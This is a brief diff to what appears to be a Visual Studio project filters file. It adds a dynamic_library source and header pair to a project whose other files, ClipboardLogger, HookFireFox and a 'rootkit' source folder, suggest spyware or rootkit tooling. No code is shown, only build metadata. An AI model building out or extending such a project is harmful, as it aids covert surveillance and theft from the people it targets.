@@ -51,6 +51,9 @@
     <ClInclude Include="ClipboardLogger.h">
       <Filter>標頭檔</Filter>
     </ClInclude>
+    <ClInclude Include="dynamic_library.h">
+      <Filter>標頭檔</Filter>
+    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="HookFireFox.cpp">
@@ -72,6 +75,9 @@
       <Filter>來源檔案\rootkit</Filter>
     </ClCompile>
     <ClCompile Include="ClipboardLogger.cpp">
+      <Filter>來源檔案</Filter>
+    </ClCompile>
+    <ClCompile Include="dynamic_library.cpp">
       <Filter>來源檔案</Filter>
     </ClCompile>
   </ItemGroup>
